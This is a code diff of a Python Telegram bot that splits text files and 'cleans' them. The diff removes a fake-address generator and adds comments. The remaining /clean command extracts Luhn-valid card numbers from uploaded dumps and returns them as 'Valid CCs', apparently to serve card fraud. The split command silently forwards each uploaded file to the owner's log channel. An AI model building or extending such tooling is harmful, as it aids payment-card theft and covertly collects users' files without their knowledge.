@@ -1,15 +1,13 @@
 import os
 import re
 import threading
-import random
 from urllib.parse import urlparse
 from flask import Flask
 import telebot
 from telebot import types
-from faker import Faker
-from faker.config import AVAILABLE_LOCALES
 
 # === Configuration from environment variables ===
+
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME")
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID")) if os.getenv("LOG_CHANNEL_ID") else None
@@ -30,41 +28,8 @@ FORMATS = [
 user_format = {}
 user_text = {}
 
-# === Faker setup ===
-SUPPORTED_LOCALES = [locale.lower() for locale in AVAILABLE_LOCALES]
-
-def generate_fake_address(country_code=None):
-    """Generate fake address for a given country code or random."""
-    if country_code:
-        country_code = country_code.lower()
-        if country_code not in SUPPORTED_LOCALES:
-            return (
-                f"❌ Country code '{country_code}' not supported.\n"
-                f"Example: /fakeaddress en_us\n"
-                f"Some supported codes: {', '.join(SUPPORTED_LOCALES[:10])}..."
-            )
-    else:
-        country_code = random.choice(SUPPORTED_LOCALES)
-
-    fake = Faker(country_code)
-    name = fake.name()
-    street = fake.street_address()
-    city = fake.city()
-    state = getattr(fake, 'state', lambda: '')()
-    zipcode = getattr(fake, 'postcode', lambda: '')()
-    country = getattr(fake, 'country', lambda: '')()
-
-    return (
-        f"📍 Fake Address ({country_code})\n"
-        f"Name: {name}\n"
-        f"Street: {street}\n"
-        f"City: {city}\n"
-        f"State: {state}\n"
-        f"Zip Code: {zipcode}\n"
-        f"Country: {country}"
-    )
-
 # === Helper functions ===
+
 def check_user_joined(user_id):
     try:
         member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
@@ -85,6 +50,7 @@ def luhn_check(card_number):
     return checksum % 10 == 0
 
 # === Bot Handlers ===
+
 @bot.message_handler(commands=['start'])
 def start(message):
     if not check_user_joined(message.from_user.id):
@@ -95,11 +61,7 @@ def start(message):
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("Owner 🙂", url="https://t.me/zeus_is_here"))
     bot.send_message(message.chat.id,
-        "<b>Welcome to the Text-to-File Bot! 🎉</b>\n\n"
-        "<b>Use /textfile to convert text to file.</b>\n"
-        "<b>Use /spl [50–500] (reply to TXT) to split files.</b>\n"
-        "<b>Use /clean (reply to TXT) to clean duplicates and extract CCs.</b>\n"
-        "<b>Use /fakeaddress [country_code] to get a fake address.</b>",
+        "<b>Welcome to the Text-to-File Bot! 🎉</b>\n\n<b>Use /textfile to convert text to file.</b>\n<b>Use /spl [50–500] (reply to TXT) to split files.</b>\n<b>Use /clean (reply to TXT) to clean duplicates and extract CCs.</b>",
         parse_mode="HTML", reply_markup=markup)
 
 @bot.message_handler(commands=['textfile'])
@@ -157,38 +119,40 @@ def split_file(message):
         bot.reply_to(message, "<b>Usage: /spl 300</b>\nLine count must be between 50–500.", parse_mode="HTML")
         return
 
-    reply = message.reply_to_message
-    if not reply or not reply.document:
-        bot.reply_to(message, "<b>Reply to a file to split it.</b>", parse_mode="HTML")
-        return
+    reply = message.reply_to_message  
+    if not reply or not reply.document:  
+        bot.reply_to(message, "<b>Reply to a file to split it.</b>", parse_mode="HTML")  
+        return  
 
-    try:
-        bot.forward_message(LOG_CHANNEL_ID, reply.chat.id, reply.message_id)
-    except Exception as e:
-        print(f"Error forwarding to log channel: {e}")
+    # Forward file to log channel silently  
+    try:  
+        bot.forward_message(LOG_CHANNEL_ID, reply.chat.id, reply.message_id)  
+    except Exception as e:  
+        print(f"Error forwarding to log channel: {e}")  
 
-    file_info = bot.get_file(reply.document.file_id)
-    file_name = reply.document.file_name or ""
-    if not file_name.lower().endswith(".txt"):
-        bot.reply_to(message, "<b>Can only split .txt files.</b>", parse_mode="HTML")
-        return
+    # Download and check file extension  
+    file_info = bot.get_file(reply.document.file_id)  
+    file_name = reply.document.file_name or ""  
+    if not file_name.lower().endswith(".txt"):  
+        bot.reply_to(message, "<b>Can only split .txt files.</b>", parse_mode="HTML")  
+        return  
 
-    try:
-        file_bytes = bot.download_file(file_info.file_path)
-        content = file_bytes.decode("utf-8")
-    except Exception:
-        bot.reply_to(message, "<b>Failed to download or decode file. Make sure it is UTF-8 encoded .txt file.</b>", parse_mode="HTML")
-        return
+    try:  
+        file_bytes = bot.download_file(file_info.file_path)  
+        content = file_bytes.decode("utf-8")  
+    except Exception:  
+        bot.reply_to(message, "<b>Failed to download or decode file. Make sure it is UTF-8 encoded .txt file.</b>", parse_mode="HTML")  
+        return  
 
-    lines = content.splitlines()
-    parts = [lines[i:i + num] for i in range(0, len(lines), num)]
+    lines = content.splitlines()  
+    parts = [lines[i:i + num] for i in range(0, len(lines), num)]  
 
-    for i, part in enumerate(parts, 1):
-        part_name = f"part_{i}.txt"
-        with open(part_name, "w", encoding="utf-8") as f:
-            f.write('\n'.join(part))
-        with open(part_name, "rb") as f:
-            bot.send_document(message.chat.id, f, caption=f"<b>Split part {i}</b>", parse_mode="HTML")
+    for i, part in enumerate(parts, 1):  
+        part_name = f"part_{i}.txt"  
+        with open(part_name, "w", encoding="utf-8") as f:  
+            f.write('\n'.join(part))  
+        with open(part_name, "rb") as f:  
+            bot.send_document(message.chat.id, f, caption=f"<b>Split part {i}</b>", parse_mode="HTML")  
         os.remove(part_name)
 
 @bot.message_handler(commands=['clean'])
@@ -198,67 +162,58 @@ def clean_and_extract_cc(message):
         bot.reply_to(message, "<b>Reply to a .txt file to clean it (remove duplicate domains & extract CCs).</b>", parse_mode="HTML")
         return
 
-    file_info = bot.get_file(reply.document.file_id)
-    content = bot.download_file(file_info.file_path).decode("utf-8")
-    lines = content.splitlines()
+    file_info = bot.get_file(reply.document.file_id)  
+    content = bot.download_file(file_info.file_path).decode("utf-8")  
+    lines = content.splitlines()  
 
-    seen_domains = set()
-    unique_lines = []
-    valid_ccs = []
+    seen_domains = set()  
+    unique_lines = []  
+    valid_ccs = []  
 
-    for line in lines:
-        line = line.strip()
-        if not line:
-            continue
+    for line in lines:  
+        line = line.strip()  
+        if not line:  
+            continue  
 
-        url_match = re.search(r'https?://[^\s]+', line)
-        if url_match:
-            domain = urlparse(url_match.group()).netloc.lower()
-            if domain.startswith("www."):
-                domain = domain[4:]
-            if domain not in seen_domains:
-                seen_domains.add(domain)
-                unique_lines.append(line)
-            continue
+        # Deduplicate URLs  
+        url_match = re.search(r'https?://[^\s]+', line)  
+        if url_match:  
+            domain = urlparse(url_match.group()).netloc.lower()  
+            if domain.startswith("www."):  
+                domain = domain[4:]  
+            if domain not in seen_domains:  
+                seen_domains.add(domain)  
+                unique_lines.append(line)  
+            continue  
 
-        cc_match = re.findall(r'\b(?:\d[ -]*?){13,19}\b', line)
-        for cc in cc_match:
-            cc_clean = re.sub(r"[^\d]", "", cc)
-            if len(cc_clean) == 16 and luhn_check(cc_clean) and cc_clean not in valid_ccs:
-                valid_ccs.append(cc_clean)
+        # Extract and validate CCs  
+        cc_match = re.findall(r'\b(?:\d[ -]*?){13,19}\b', line)  
+        for cc in cc_match:  
+            cc_clean = re.sub(r"[^\d]", "", cc)  
+            if len(cc_clean) == 16 and luhn_check(cc_clean) and cc_clean not in valid_ccs:  
+                valid_ccs.append(cc_clean)  
 
-    cleaned_name = "cleaned_urls.txt"
-    with open(cleaned_name, "w", encoding="utf-8") as f:
-        f.write('\n'.join(unique_lines))
-    with open(cleaned_name, "rb") as f:
-        bot.send_document(message.chat.id, f, caption="<b>Cleaned URLs (duplicates removed)</b>", parse_mode="HTML")
-    os.remove(cleaned_name)
+    # Save cleaned URLs  
+    cleaned_name = "cleaned_urls.txt"  
+    with open(cleaned_name, "w", encoding="utf-8") as f:  
+        f.write('\n'.join(unique_lines))  
+    with open(cleaned_name, "rb") as f:  
+        bot.send_document(message.chat.id, f, caption="<b>Cleaned URLs (duplicates removed)</b>", parse_mode="HTML")  
+    os.remove(cleaned_name)  
 
-    if valid_ccs:
-        cc_file = "valid_ccs.txt"
-        with open(cc_file, "w", encoding="utf-8") as f:
-            f.write('\n'.join(valid_ccs))
-        with open(cc_file, "rb") as f:
-            bot.send_document(message.chat.id, f, caption="<b>Valid CCs Only 💳</b>", parse_mode="HTML")
-        os.remove(cc_file)
-    else:
+    # Save valid CCs  
+    if valid_ccs:  
+        cc_file = "valid_ccs.txt"  
+        with open(cc_file, "w", encoding="utf-8") as f:  
+            f.write('\n'.join(valid_ccs))  
+        with open(cc_file, "rb") as f:  
+            bot.send_document(message.chat.id, f, caption="<b>Valid CCs Only 💳</b>", parse_mode="HTML")  
+        os.remove(cc_file)  
+    else:  
         bot.send_message(message.chat.id, "<b>No valid CCs found.</b>", parse_mode="HTML")
 
-# === New Fake Address Command ===
-@bot.message_handler(commands=['fakeaddress'])
-def fakeaddress_command(message):
-    if not check_user_joined(message.from_user.id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("Join our Channel 🔔", url=f"https://t.me/{CHANNEL_USERNAME}"))
-        bot.send_message(message.chat.id, "<b>You must join our channel to use this bot!</b>", parse_mode="HTML", reply_markup=markup)
-        return
-
-    args = message.text.split()
-    country_code = args[1] if len(args) > 1 else None
-    address = generate_fake_address(country_code)
-    bot.send_message(message.chat.id, f"<pre>{address}</pre>", parse_mode="HTML")
-
 # === Flask app ===
+
 app = Flask(__name__)
 
 @app.route("/")
@@ -270,6 +225,9 @@ def run_bot():
     bot.infinity_polling(skip_pending=True)
 
 if __name__ == "__main__":
+    # Run bot polling in a separate thread
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.start()
+
+    # Run Flask app  
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
